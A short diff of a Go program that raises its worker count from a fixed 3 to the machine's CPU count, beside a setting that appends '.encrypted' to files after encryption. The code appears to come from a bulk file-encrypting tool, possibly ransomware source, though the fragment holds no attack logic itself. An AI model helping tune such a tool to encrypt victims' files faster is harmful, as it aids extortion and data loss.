@@ -91,7 +91,7 @@ var (
 	}()
 
 	// Workers processing the files
-	NumWorkers = 3
+	NumWorkers = runtime.NumCPU()
 
 	// Extension appended to files after encryption
 	EncryptionExtension = ".encrypted"
